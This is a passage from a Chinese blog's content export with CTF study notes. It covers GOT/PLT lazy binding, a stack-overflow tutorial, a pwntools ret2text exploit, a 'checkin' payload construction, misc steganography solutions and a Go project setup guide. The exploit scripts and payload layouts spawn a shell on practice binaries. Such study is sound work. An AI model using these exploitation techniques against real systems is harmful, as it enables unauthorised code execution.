，就去访问保存在 .got.plt 中的 fun@plt 。这里有两种情况，第一种就是第一次使用这个函数，这个地方就存放着第二条指令的地址，也就相当于什么都不做。用 objdump -d -s got -j .got.plt 命令查看节中的内容</p><blockquote><p>-s 参数显示指定节的所有内容</p></blockquote><p><a href="https://image.3001.net/images/20180912/1536733936_5b98b2f08b3d6.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180912/1536733936_5b98b2f08b3d6.png!small" alt="got.plt"></a></p><p>4014 处存放着 66 10 00 00 ，因为是小端序所以应为 0×00001066，这个位置刚好对应着 push 0×10 这条指令，这个值是 test 这个符号在 .rel.plt 节中的下标。继续 jmp 指令跳到 .plt 处</p><p><a href="https://image.3001.net/images/20180912/1536737269_5b98bff50df77.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180912/1536737269_5b98bff50df77.png!small" alt=".plt"></a></p><p>push DWORD PTR [ebx + 0x4] 指令是将当前模块ID压栈，也就是 got.c 模块，接着 jmp DWORD PTR [ebx + 0x8] ，这个指令就是跳转到 <strong>动态链接器</strong> 中的 _dl_runtime_resolve 函数中去。这个函数的作用就是在另外的模块中查找需要的函数，就是这里的在 got_extern.so 模块中的 test 函数。然后_dl_runtime_resolve函数会将 test() 函数的真正地址填入到 test@got 中去也就是 .got.plt 节中。那么第二种情况就是，当第二次调用test()@plt 函数时，就会通过第一条指令跳转到真正的函数地址。整个过程就是所说的通过 <strong>plt</strong> 来实现 <strong>延迟绑定</strong> 。程序调用外部函数的整个过程就是，第一次访问 test@plt 函数时，<strong>动态链接器</strong>就会去动态共享模块中查找 test 函数的真实地址然后将真实地址保存到test@got中(.got.plt)；第二次访问test@plt时，就直接跳转到test@got中去。</p><h2 id="0x100-参考资料"><a href="#0x100-参考资料" class="headerlink" title="0x100 参考资料"></a>0x100 参考资料</h2><ol><li><p>《程序员的自我修养 —— 链接，装载与库》第三章 3.1 目标文件的格式</p></li><li><p><a href="https://www.freebuf.com/news/182894.html" target="_blank" rel="noopener">StackOverFlow之Ret2libc详解</a> </p></li></ol><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwn基础----栈基础</title>
      <link href="/2020/02/09/ctf/pwn/pwn-zhan/"/>
      <url>/2020/02/09/ctf/pwn/pwn-zhan/</url>
      
        <content type="html"><![CDATA[<h1 id="Pwn基础——栈基础"><a href="#Pwn基础——栈基础" class="headerlink" title="Pwn基础——栈基础"></a>Pwn基础——栈基础</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>本文参考：<a href="https://paper.seebug.org/271/" target="_blank" rel="noopener">https://paper.seebug.org/271/</a>  手把手教你栈溢出从入门到放弃（上）</p><p>本文只在原作者的基础上增加了一些ctf-wiki上的一些例子</p><p>本文只做学习记录使用、不做他用</p><p>这几天开始整理栈溢出、后面整理堆溢出</p><h2 id="0x10-函数调用栈"><a href="#0x10-函数调用栈" class="headerlink" title="0x10 函数调用栈"></a>0x10 函数调用栈</h2><p>函数调用栈是指程序运行时内存一段连续的区域，用来保存函数运行时的状态信息，包括函数参数与局部变量等。称之为“栈”是因为发生函数调用时，调用函数（caller）的状态被保存在栈内，被调用函数（callee）的状态被压入调用栈的栈顶；在函数调用结束时，栈顶的函数（callee）状态被弹出，栈顶恢复到调用函数（caller）的状态。函数调用栈在内存中从高地址向低地址生长，所以栈顶对应的内存地址在压栈时变小，退栈时变大。</p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200208220131.png" alt=""></p><p>函数调用发生和结束时调用栈的变化：</p><p>函数状态主要涉及三个寄存器－－esp，ebp，eip。esp 用来存储函数调用栈的栈顶地址，在压栈和退栈时发生变化。ebp 用来存储当前函数状态的基地址，在函数运行时不变，可以用来索引确定函数参数或局部变量的位置。eip 用来存储即将执行的程序指令的地址，cpu 依照 eip 的存储内容读取指令并执行，eip 随之指向相邻的下一条指令，如此反复，程序就得以连续执行指令。</p><p>下面让我们来看看发生函数调用时，栈顶函数状态以及上述寄存器的变化。变化的核心任务是将调用函数（caller）的状态保存起来，同时创建被调用函数（callee）的状态。</p><p>首先将被调用函数（callee）的参数按照逆序依次压入栈内。如果被调用函数（callee）不需要参数，则没有这一步骤。这些参数仍会保存在调用函数（caller）的函数状态内，之后压入栈内的数据都会作为被调用函数（callee）的函数状态来保存。</p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200208220129.png" alt=""></p><p>将被调用函数的参数压入栈内</p><p>然后将调用函数（caller）进行调用之后的下一条指令地址作为返回地址压入栈内。这样调用函数（caller）的 eip（指令）信息得以保存。</p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200208220139.png" alt=""></p><p>将被调用函数的返回地址压入栈内</p><p>再将当前的ebp 寄存器的值（也就是调用函数的基地址）压入栈内，并将 ebp 寄存器的值更新为当前栈顶的地址。这样调用函数（caller）的 ebp（基地址）信息得以保存。同时，ebp 被更新为被调用函数（callee）的基地址。</p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200208220135.png" alt=""></p><p>将调用函数的基地址（ebp）压入栈内，并将当前栈顶地址传到 ebp 寄存器内</p><p>再之后是将被调用函数（callee）的局部变量等数据压入栈内。</p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200208220144.png" alt=""></p><p>将被调用函数的局部变量压入栈内</p><p>在压栈的过程中，esp 寄存器的值不断减小（对应于栈从内存高地址向低地址生长）。压入栈内的数据包括调用参数、返回地址、调用函数的基地址，以及局部变量，其中调用参数以外的数据共同构成了被调用函数（callee）的状态。在发生调用时，程序还会将被调用函数（callee）的指令地址存到 eip 寄存器内，这样程序就可以依次执行被调用函数的指令了。</p><p>看过了函数调用发生时的情况，就不难理解函数调用结束时的变化。变化的核心任务是丢弃被调用函数（callee）的状态，并将栈顶恢复为调用函数（caller）的状态。</p><p>首先被调用函数的局部变量会从栈内直接弹出，栈顶会指向被调用函数（callee）的基地址。</p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200208220136.png" alt=""></p><p>将被调用函数的局部变量弹出栈外</p><p>然后将基地址内存储的调用函数（caller）的基地址从栈内弹出，并存到 ebp 寄存器内。这样调用函数（caller）的 ebp（基地址）信息得以恢复。此时栈顶会指向返回地址。</p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200208220138.png" alt=""></p><p>将调用函数（caller）的基地址（ebp）弹出栈外，并存到 ebp 寄存器内</p><p>再将返回地址从栈内弹出，并存到 eip 寄存器内。这样调用函数（caller）的 eip（指令）信息得以恢复。</p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200208220130.png" alt=""></p><p>将被调用函数的返回地址弹出栈外，并存到 eip 寄存器内</p><p>至此调用函数（caller）的函数状态就全部恢复了，之后就是继续执行调用函数的指令了。</p><h2 id="0x20-技术清单"><a href="#0x20-技术清单" class="headerlink" title="0x20 技术清单"></a>0x20 技术清单</h2><p>当函数正在执行内部指令的过程中我们无法拿到程序的控制权，只有在发生函数调用或者结束函数调用时，程序的控制权会在函数状态之间发生跳转，这时才可以通过修改函数状态来实现攻击。而控制程序执行指令最关键的寄存器就是 eip（还记得 eip 的用途吗？），所以我们的目标就是让 eip 载入攻击指令的地址。</p><p>先来看看函数调用结束时，如果要让 eip 指向攻击指令，需要哪些准备？首先，在退栈过程中，返回地址会被传给 eip，所以我们只需要让溢出数据用攻击指令的地址来覆盖返回地址就可以了。其次，我们可以在溢出数据内包含一段攻击指令，也可以在内存其他位置寻找可用的攻击指令。</p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200208220142.png" alt=""></p><p>核心目的是用攻击指令的地址来覆盖返回地址</p><p>再来看看函数调用发生时，如果要让 eip 指向攻击指令，需要哪些准备？这时，eip 会指向原程序中某个指定的函数，我们没法通过改写返回地址来控制了，不过我们可以“偷梁换柱”－－将原本指定的函数在调用时替换为其他函数。</p><p>所以这篇文章会覆盖到的技术大概可以总结为（括号内英文是所用技术的简称）：</p><ul><li>修改返回地址，让其指向溢出数据中的一段指令（<strong>shellcode</strong>）</li><li>修改返回地址，让其指向内存中已有的某个函数（<strong>return2libc</strong>）</li><li>修改返回地址，让其指向内存中已有的一段指令（<strong>ROP</strong>）</li><li>修改某个被调用函数的地址，让其指向另一个函数（<strong>hijack GOT</strong>）</li></ul><h2 id="0x30-example"><a href="#0x30-example" class="headerlink" title="0x30 example"></a>0x30 example</h2><p>下面我们通过一道非常简单的题来理解栈溢出</p><p>此例子来源于\CTF-wiki\ctf-challenges\pwn\stackoverflow\ret2text\bamboofox-ret2text</p><p>在 ctf-wiki\ctf-challenges（<a href="https://github.com/CTF-wiki/ctf-challenges.git）上可以下载到" target="_blank" rel="noopener">https://github.com/CTF-wiki/ctf-challenges.git）上可以下载到</a></p><p>源代码</p><pre class=" language-lang-c"><code class="language-lang-c">#include <stdio.h>#include <stdlib.h>#include <time.h>void secure(void){    int secretcode, input;    srand(time(NULL));    secretcode = rand();    scanf("%d", &amp;input);    if(input == secretcode)        system("/bin/sh");}int main(void){    setvbuf(stdout, 0LL, 2, 0LL);    setvbuf(stdin, 0LL, 1, 0LL);    char buf[100];    printf("There is something amazing here, do you know anything?\n");    gets(buf);    printf("Maybe I will tell you next time !");    return 0;}</time.h></stdlib.h></stdio.h></code></pre><p>编译命令：</p><pre class=" language-lang-txt"><code class="language-lang-txt">gcc -m32 -fno-stack-protector\\关闭栈保护</code></pre><p>通过gets()函数我们可以读取任意长度的字符串进入栈中</p><p>于是我们就可以通过gets()一定长度的数据来填充EBP，从上面函数调用栈的过程中我们可以了解到：EBP后面就是函数的返回地址，当我们填充完EBP后如果我们在输入就会覆盖掉函数的返回地址，函数会将我们输入的东西（比如：0x12345678）作为返回地址，在退栈的过程中我们输入的返回地址会被传给EIP，此时EIP就会指向(0x12345678)就完成了我们的目的</p><p>而相对于本题：</p><p>如果我们将返回地址修改为：0x0804863A</p><p>程序就会执行：</p><pre class=" language-lang-txt"><code class="language-lang-txt">mov     dword ptr [esp], offset command ; "/bin/sh"call    _system</code></pre><p>从而返回给我们shell</p><p>exp:</p><pre class=" language-lang-python"><code class="language-lang-python">#!/usr/bin/env pythonfrom pwn import *sh = process('./ret2text')target = 0x804863ash.sendline('A' * (0x6c + 4) + p32(target))sh.interactive()</code></pre><h2 id="0x100-知识详细介绍"><a href="#0x100-知识详细介绍" class="headerlink" title="0x100 知识详细介绍"></a>0x100 知识详细介绍</h2><pre class=" language-lang-txt"><code class="language-lang-txt">eax, ebx, ecx, edx, esi, edi, ebp, esp等都是X86 汇编语言中CPU上的通用寄存器的名称，是32位的寄存器。EAX 是"累加器"(accumulator), 它是很多加法乘法指令的缺省寄存器。EBX 是"基地址"(base)寄存器, 在内存寻址时存放基地址。ECX 是计数器(counter), 是重复(REP)前缀指令和LOOP指令的内定计数器。EDX 则总是被用来放整数除法产生的余数。ESI/EDI分别叫做"源/目标索引寄存器"(source/destination index),因为在很多字符串操作指令中, DS:ESI指向源串,而ES:EDI指向目标串.EBP是"基址指针"(BASE POINTER), 它最经常被用作高级语言函数调用的"框架指针"(frame pointer). 在破解的时候,经常可以看见一个标准的函数起始代码:push ebp ;保存当前ebpmov ebp,esp ;EBP设为当前堆栈指针sub esp, xxx ;预留xxx字节给函数临时变量....这样一来,EBP 构成了该函数的一个框架, 在EBP上方分别是原来的EBP, 返回地址和参数. EBP下方则是临时变量. 函数返回时作 mov esp,ebp/pop ebp/ret 即可.ESP 专门用作堆栈指针，被形象地称为栈顶指针，堆栈的顶部是地址小的区域，压入堆栈的数据越多，ESP也就越来越小。在32位平台上，ESP每次减少4字节。1. esp 用来存储函数调用栈的栈顶地址，在压栈和退栈时发生变化。2. ebp 用来存储当前函数状态的基地址，在函数运行时不变，可以用来索引确定函数参数或局部变量的位置。3. eip 用来存储即将执行的程序指令的地址，cpu 依照 eip 的存储内容读取指令并执行，eip 随之指向相邻的下一条指令，如此反复，程序就得以连续执行指令。</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn-checkin</title>
      <link href="/2020/01/24/ctf/pwn/pwn-checkin/"/>
      <url>/2020/01/24/ctf/pwn/pwn-checkin/</url>
      
        <content type="html"><![CDATA[<h1 id="Checkin解题思路一"><a href="#Checkin解题思路一" class="headerlink" title="Checkin解题思路一"></a>Checkin解题思路一</h1><h2 id="文件属性"><a href="#文件属性" class="headerlink" title="文件属性"></a>文件属性</h2><p>file查看发现文件是32位的</p><h2 id="Checksec"><a href="#Checksec" class="headerlink" title="Checksec"></a>Checksec</h2><p>checksec发现程序开启了NX保护</p><h2 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h2><p>IDA反编译查看源代码</p><pre class=" language-lang-c"><code class="language-lang-c">checker函数int __cdecl checker(int a1){  int result; // eax@2  char buf; // [sp+Eh] [bp-3Ah]@1  char name[4]; // [sp+2Ch] [bp-1Ch]@1  int v4; // [sp+30h] [bp-18h]@1  char *s; // [sp+34h] [bp-14h]@2  int (__cdecl *v6)(int); // [sp+38h] [bp-10h]@1  int v7; // [sp+3Ch] [bp-Ch]@1  v7 = 8;  *name = 1819042157;  v4 = 25455;  printf("your input : ");  read(0, &amp;buf, 0x4Au);  strncpy(st, &amp;buf, 8u);  v6 = load(name);  if ( a1 == -559038737 )  {    s = v6(v7);    __isoc99_scanf("%s", s);    result = puts(s);  }  else  {    result = puts("Think about it ");  }  return result;}</code></pre><pre class=" language-lang-c"><code class="language-lang-c">load()函数void *__cdecl load(char *name){  char *v1; // eax@2  void *handle; // [sp+8h] [bp-10h]@1  void *v4; // [sp+Ch] [bp-Ch]@4  handle = dlopen("/lib32/libc.so.6", 258);  if ( !handle )  {    v1 = dlerror();    printf("dlopen - %s\n", v1);    exit(0);  }  v4 = dlsym(handle, name);  if ( !v4 )  {    puts("Can't load function");    exit(0);  }  return v4;}</code></pre><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>发现load函数提供了根据传入的参数 字符串name 进而找到的libc库中的函数地址 然后返回给了v4，我们来分析下 怎么 pwn 掉这个程序? 执行 system(‘/bin/sh’) 。</p><ol><li>main()函数中read存在溢出，但是字节为0x4a-0x3a, 太少，因此我们去分析load函数</li><li>通过buf将name覆盖为system 0x3a-0x1c=30=0x1e</li><li>system 是 libc 中 的函数，我们 将局部变量name 覆盖为 system</li><li>我们将 v7 覆盖为 /bin/sh 所在的地址，即 st 地址</li><li>全局变量st = payload 前 8个字符，paylaod前八个字符为 /bin/sh\x00</li><li>当参数 a1为 0xDEADBEEF 时 才会 执行 v5(v6) ，所以我们还要将 参数 a1 覆盖为 0xDEADBEEF！</li></ol><h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><p>因此payload:</p><pre class=" language-lang-txt"><code class="language-lang-txt">payload="/bin/sh\x00".ljust(0x1e,"\x00")+"system\x00" #0x3a-0x1c=0x1e + system= 将name覆盖为systempayload=payload.ljust(0x2e,"\x00")+p32(st_addr) #因为程序是32 位程序 0x1e+0x10(v6)payload=payload.ljust(0x3e,"\x00") #ebp buf为0x3a 0x3a+0x4填充EBPpayload+=p32(0) #返回地址paylaod+=p32(0xdeadbeef) #参数 1</code></pre><p>pwn32位payload构造:</p><pre class=" language-lang-txt"><code class="language-lang-txt">方法一：payload = 'a' * offset + 4 * 'a' + p32(sys_addr) + p32(4) + p32(sh_addr)方法二：payload = 'a' * offset + 4 * 'a' + p32(read_addr) + p32(elf.bss()) + p32(0) + p32(elf.bss()) + p32(len(shellcode))</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>西南石油大学CTF做题记录</title>
      <link href="/2019/12/07/ctf/misc/swpuctf/"/>
      <url>/2019/12/07/ctf/misc/swpuctf/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>​    起床打CTF了,登陆平台，一看题目简单的python,easy_web，一看一道不会，，，，tcl除了misc,啥都不会</p><p>​    人傻了，先做两道 misc 吧</p><h1 id="Misc部分"><a href="#Misc部分" class="headerlink" title="Misc部分"></a>Misc部分</h1><p>这次misc一共先发出来了五道题，我做出来四道，那一道影流之主…tql</p><h2 id="神奇的二维码"><a href="#神奇的二维码" class="headerlink" title="神奇的二维码"></a>神奇的二维码</h2><p>题目描述：啥也不说了，扫码支付获取flag^_^ || hint1：flag全是小写</p><p>图种套娃题，mp3隐写</p><p>给了张图</p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20191206222617.png" alt="题目"></p><p>不用扫了，swpuctf{flag_is_not_here}</p><p>binwalk直接提取，提取出一大堆东西</p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20191206223558.png" alt="提取后"></p><p>（good.mp3、flag.doc等好几个不是啊，#我忘了）</p><p>思就是套娃题的思路</p><p>拿encode.txt里的东西取解flag在不在里面</p><p>解出来以后取出里面的flag.doc,flag.jpg</p><p>写脚本解flag.doc里面的base64</p><pre class=" language-lang-python"><code class="language-lang-python">import base64fp=open("flag.txt",'r')for line in fp:    flag=base64.b64decode(line)    while base64.b64decode(flag):        if 'flag' in flag:            print(flag)            break        else:            flag = base64.b64decode(flag)</code></pre><p>解出来后拿去解</p><pre class=" language-lang-shell"><code class="language-lang-shell">binwalk flag.jpg -e</code></pre><p>出来的压缩包</p><p>然后解出来good.mp3,放入Audacity中</p><p>看出来是摩斯密码</p><p>解出来flag</p><pre class=" language-lang-txt"><code class="language-lang-txt">morseisveryveryveryeasy</code></pre><p>套上格式提交</p><h2 id="漂流的马里奥"><a href="#漂流的马里奥" class="headerlink" title="漂流的马里奥"></a>漂流的马里奥</h2><p>题目描述：链接：<a href="https://pan.baidu.com/s/1Bj2LJMNwSch-cKMK56K9hg" target="_blank" rel="noopener">https://pan.baidu.com/s/1Bj2LJMNwSch-cKMK56K9hg</a> 提取码：d3fp</p><p>取证分析题</p><p>运行题目给的.exe文件后，电脑桌面上多出来一个内容是ntfs,flag.txt的文件</p><p>ntfs是什么，百度就行了</p><p>然后找ntfs隐藏流查找工具</p><p>Ntfs Streams Editor</p><p>然后让他扫一遍就行了，这里不写了，我放到虚拟机里扫的</p><pre class=" language-lang-txt"><code class="language-lang-txt">swupctf{ddg_is_cute}</code></pre><h2 id="伟大的侦探"><a href="#伟大的侦探" class="headerlink" title="伟大的侦探"></a>伟大的侦探</h2><p>题目描述：链接：<a href="https://pan.baidu.com/s/1JaMbDl0efPPsGKxA7x3ULw" target="_blank" rel="noopener">https://pan.baidu.com/s/1JaMbDl0efPPsGKxA7x3ULw</a> 提取码：9zcf || hint1：压缩包密码解码之后最后一位是! || hint2：flag没有空格，格式为swpuctf{}</p><p>脑洞题</p><p>先是给了一个压缩包，里面有一个密码.txt</p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20191206230004.png" alt="密码.txt"></p><p>有一说一我找了一下午也没找到这是什么编码</p><p>但终于我在一个misc大佬的博客里找到了这个编码怎么解 附大佬博客：</p><p><a href="https://blog.xiafeng2333.top/author/xiafeng2333/" target="_blank" rel="noopener">https://blog.xiafeng2333.top/author/xiafeng2333/</a></p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20191206230853.png" alt=""></p><p>解压发现一堆</p><p>火柴人？？？？</p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20191206231053.png" alt=""></p><p>在看了大半天火柴人跳舞以及百度后</p><p>运气爆棚，我搜了以下密码吧，结果发现了这个</p><p>福尔摩斯小人跳舞，原来题目是这个意思啊</p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20191206231552.jpg" alt=""></p><p>照着上面解密</p><pre class=" language-lang-txt"><code class="language-lang-txt">swpuctf{iloveholmesandwllm}</code></pre><h2 id="Network"><a href="#Network" class="headerlink" title="Network"></a>Network</h2><p>题目描述</p><p>链接：<a href="https://pan.baidu.com/s/1MKlcjLakWYDjk1B8G1OquQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1MKlcjLakWYDjk1B8G1OquQ</a> 提取码：gx4l || 描述：flag格式为flag{} || hint：ttl || hint2：伪加密</p><p>ttl隐写</p><p>题目说的很清楚了</p><p>打开压缩包发现里面只有一个t.txt</p><p>t.txt里面是63 127 191 255这几个字符</p><p>根据题目的提示</p><pre class=" language-lang-txt"><code class="language-lang-txt">63    00111111 127   01111111 191   10111111 255   11111111</code></pre><p>每个取前两位组成新的八位二进制</p><p>发现前八位的二进制为</p><pre class=" language-lang-txt"><code class="language-lang-txt">00110101 00110000 00110100 01100010</code></pre><p>转换成ascii</p><pre class=" language-lang-txt"><code class="language-lang-txt">504b</code></pre><p>压缩包的开头</p><p>贴上解密脚本</p><pre class=" language-lang-python"><code class="language-lang-python">fp = open('t.txt','r')a=fp.readlines()p=[]for i in a:    p.append(int(i))s=''for i in p:    if i==63:        a='00'    elif i==127:        a='01'    elif i==191:        a='10'    elif i==255:        a='11'    s += a#print(s)import binasciiflag=''for i in range(0,len(s),8):    flag += chr(int(s[i:i+8],2))flag=binascii.unhexlify(flag)wp=open('res.zip','wb')wp.write(flag)wp.close()</code></pre><p>解出的压缩包里面有base64加密</p><p>上解密脚本：</p><pre class=" language-lang-python"><code class="language-lang-python">import base64fp=open("flag.txt",'r')for line in fp:    flag=base64.b64decode(line)    while base64.b64decode(flag):        if 'flag' in flag:            print(flag)            break        else:            flag = base64.b64decode(flag)</code></pre><p>解出flag</p><pre class=" language-lang-txt"><code class="language-lang-txt">flag{189ff9e5b743ae95f940a6ccc6dbd9ab}</code></pre><h2 id="你好好看网课了吗"><a href="#你好好看网课了吗" class="headerlink" title="你好好看网课了吗"></a>你好好看网课了吗</h2><p>网课12.6截至，我看了/xyx，有没有好好看就不一定了</p><p>题目描述<a href="https://pan.baidu.com/s/10aXg8SrgyhQqeceBbD3tZg" target="_blank" rel="noopener">https://pan.baidu.com/s/10aXg8SrgyhQqeceBbD3tZg</a> 提取码：078j || hint1：word文档很重要 || hint2：工具也许是某种视频剪辑工具 || hint3：word文档中的数字很重要 || 压缩包密码都是小写</p><p>不会写，没工具</p><p>个人感觉应该是MP4提取出来音频后，用MP3stego结合word文档中的东西解出来压缩包，然后暴力破解？</p><h1 id="Web部分"><a href="#Web部分" class="headerlink" title="Web部分"></a>Web部分</h1><p>web也就签到题我能做一下</p><h2 id="easy-web"><a href="#easy-web" class="headerlink" title="easy_web"></a>easy_web</h2><p>hint1：不是xss || hint2：使用somd5解flag</p><p>题目说了不是xss,随便注册登陆进去后，发现可以发文章</p><p>在标题处下单引号后，保存返回查看文章，发现SQL语句报错</p><p>结合报错应该就是Limit Sql注入</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> swpuctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go-web github 开源项目 puti 学习</title>
      <link href="/2019/12/04/go-web/puti/"/>
      <url>/2019/12/04/go-web/puti/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>​    学习 GO 已经将近一年的时间，在学校因为杂七杂八的事情学习进度一直很慢，可能还是因为自己的颓废，以及对时间的安排不是很合理吧。</p><p>​    指导老师说项目驱动学习，会提高我的学习效率，而工作室这边也都是商业项目，不能用来学习。听了指导老师的意见以后，在网上找了大半天，主要是Go的web项目实在是少的可怜，终于让我找到了一个前后端分离的项目 <a href="https://github.com/puti-projects/puti" target="_blank" rel="noopener">puti</a></p><p>​    这是一个博客系统，其实我一直也想做一个博客系统来练练手，，，</p><h1 id="项目运行"><a href="#项目运行" class="headerlink" title="项目运行"></a>项目运行</h1><p>​    由于这是我第一次在github上找开源项目来学习，在学习的第一步就遇到了很多问题，，，</p><p>​    在这里，我把我遇到的问题记录一下，积累经验，同时也能方便后边遇到同样问题的人使用</p><h1 id="下载安装"><a href="#下载安装" class="headerlink" title="下载安装"></a>下载安装</h1><p>​    由于对docker的使用不够熟练，这次我选择的是源码安装，有时间学习一下docker</p><h2 id="源码安装"><a href="#源码安装" class="headerlink" title="源码安装"></a>源码安装</h2><h3 id="Go语言下载与环境变量配置"><a href="#Go语言下载与环境变量配置" class="headerlink" title="Go语言下载与环境变量配置"></a>Go语言下载与环境变量配置</h3><p>关于Go语言在linux Ubantu中的下载配置有很多教程，但当我使用那些教程的时候还是遇到了很多问题，因此在这里我自己在写一遍教程</p><p>首先是Go语言的下载，<a href="https://golang.google.cn/" target="_blank" rel="noopener">Go</a></p><p>选择适合你系统的Go语言下载，本次项目要求Go语言的版本在<strong>1.11</strong>以上（以下的还真用不了），1.11以上有Go module</p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20191203175333.png" alt="Golang官网"></p><p>下载过后，我们把它解压到 /usr/local/ 目录下</p><pre class=" language-lang-shell"><code class="language-lang-shell">tar -C /usr/local -xzf go1.13.4.linux-amd64.tar.gz</code></pre><p>接下来就是配置环境变量, 在/etc/profile （即全局环境变量下修改）最后添加</p><pre class=" language-lang-shell"><code class="language-lang-shell">vim /etc/profile</code></pre><pre class=" language-lang-shell"><code class="language-lang-shell">export GOROOT=/usr/local/goexport GOPATH=$HOME/go #这里是你go的workspaceexport PATH=$PATH:$GOROOT/bin</code></pre><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20191203181150.png" alt="屏幕截图"></p><pre class=" language-lang-shell"><code class="language-lang-shell">source /etc/profile</code></pre><p>立刻生效</p><p>这里可能会出现一个问题，就是关闭终端后，环境变量就失效了，在网上查了半天后，我的解决方法是这样的</p><pre class=" language-lang-shell"><code class="language-lang-shell">vim ~/.bashrc</code></pre><p>在里面添加</p><pre class=" language-lang-shell"><code class="language-lang-shell">export GOPATH=$HOME/goexport GOROOT=/usr/local/goexport GOARCH=386export GOOS=linuxexport GOTOOLS=$GOROOT/pkg/toolexport PATH=$PATH:$GOROOT/bin:$GOPATH/bin</code></pre><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20191203182609.png" alt="屏幕截图"></p><pre class=" language-lang-shell"><code class="language-lang-shell">go version //检测安装是否成功</code></pre><p>到此安装Go就算完成了</p><h3 id="Git下载"><a href="#Git下载" class="headerlink" title="Git下载"></a>Git下载</h3><p>最简单的下载方式</p><pre class=" language-lang-shell"><code class="language-lang-shell">apt-get install git</code></pre><p>这种安装方式不是很好</p><p>其他安装方法也百度得到，这里就不写了</p><h3 id="源码下载"><a href="#源码下载" class="headerlink" title="源码下载"></a>源码下载</h3><pre class=" language-lang-txt"><code class="language-lang-txt"># 下载$ go get -u github.com/puti-projects/puti# 使用Makefile来构建程序$ cd $GOPATH/src/github.com/puti-projects/puti$ make</code></pre><p>本次安装是在我的Ubantu16.04的虚拟机上，windows下出了很多问题，浪费了我很多时间。</p><h3 id="MySQL下载"><a href="#MySQL下载" class="headerlink" title="MySQL下载"></a>MySQL下载</h3><p>这个项目需要mysql数据库来运行</p><p>MySQL的安装教程 <a href="https://blog.csdn.net/james_nan/article/details/82053430" target="_blank" rel="noopener">https://blog.csdn.net/james_nan/article/details/82053430</a></p><p>接下来就是把puti下面的sql文件导入到数据库中</p><p>先建好数据库</p><pre class=" language-lang-shell"><code class="language-lang-shell">$ mysql -uroot -p$ create database db_puti</code></pre><p>导入sql文件</p><pre class=" language-lang-shell"><code class="language-lang-shell">$ cd $GOPATH/src/github.com/puti-projects/puti/init/scheam/</code></pre><pre class=" language-lang-shell"><code class="language-lang-shell">$ mysql -uroot -p -B db_puti &lt; db_puti.sql</code></pre><h2 id="修改配置文件"><a href="#修改配置文件" class="headerlink" 